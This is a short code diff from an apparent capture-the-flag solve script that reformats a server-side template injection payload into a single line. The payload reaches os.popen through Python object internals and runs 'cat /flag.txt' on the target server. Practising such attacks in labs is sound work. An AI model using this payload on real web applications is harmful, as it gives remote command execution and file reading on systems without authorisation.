@@ -46,8 +46,7 @@ from bs4 import BeautifulSoup
 
 # define SSTI payload
 payload = urlencode({
-        "name": "{{'foo'.__class__.__base__.__subclasses__()[182].__init__"\
-            ".__globals__['sys'].modules['os'].popen('cat /flag.txt').read()}}"
+        "name": "{{'foo'.__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen('cat /flag.txt').read()}}"
     })
 
 # send request and get result
